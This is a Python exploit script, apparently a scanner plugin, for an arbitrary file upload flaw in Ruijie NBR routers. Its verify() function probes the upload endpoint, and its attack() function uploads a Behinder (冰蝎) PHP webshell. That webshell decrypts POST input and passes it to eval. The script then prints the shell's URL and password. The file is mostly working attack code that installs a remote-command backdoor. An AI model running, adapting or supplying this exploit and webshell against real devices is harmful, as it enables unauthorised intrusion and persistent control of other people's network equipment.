import requests
import re
import urllib, random, string

def verify(url):
    relsult = {
        'name': '锐捷-NBR 任意文件上传(2022HVV)',
        'vulnerable': False,
        'attack': True,
        'url': url,
    }
    filename = ''.join(random.sample(string.digits + string.ascii_letters, 4)) + '.txt'
    shell = ''.join(random.sample(string.digits + string.ascii_letters, 12))
    payload = '/ddi/server/fileupload.php'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=--------801303113',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '----------801303113\r\nContent-Disposition: form-data; name="uploadDir"\r\n\r\nupload\r\n----------801303113\r\nContent-Disposition: form-data; name="file";filename="{0}";\r\nContent-Type:text/html;\r\n\r\n{1}\r\n----------801303113--'.format(filename, shell)
    verify_url = urllib.parse.urljoin(url, '/ddi/server/upload/' + filename)
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if re.search('jsonrpc', rep.text) and re.search(filename, rep.text):
            rep = requests.get(verify_url, headers=headers, timeout=timeout, verify=False)
            if rep.status_code == 200 and re.search(shell, rep.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult

def attack(url):
    print('[+] Exploit loading ......')
    filename = ''.join(random.sample(string.digits + string.ascii_letters, 4)) + '.php'
    shell = '''<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b";
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>'''
    payload = '/ddi/server/fileupload.php'
    timeout = 20
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=--------801303113',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '----------801303113\r\nContent-Disposition: form-data; name="uploadDir"\r\n\r\nupload\r\n----------801303113\r\nContent-Disposition: form-data; name="file";filename="{0}";\r\nContent-Type:text/html;\r\n\r\n{1}\r\n----------801303113--'.format(filename, shell)
    verify_url = urllib.parse.urljoin(url, '/ddi/server/upload/' + filename)
    try:
        print('[+] 尝试上传冰蝎webshell ')
        requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        print('[+] 上传完成，正在检查是否上传成功?')
        rep = requests.get(verify_url, headers=headers, timeout=timeout, verify=False)
        if rep.status_code == 200:
            print('[*] status: 200 上传成功!')
            print('[*] webshell(冰蝎): ', verify_url)
            print('[*] 密码: rebeyond')
            return True
        print('[-] 未检查到webshell, 手动尝试:', verify_url)
        return False
    except:
        return False

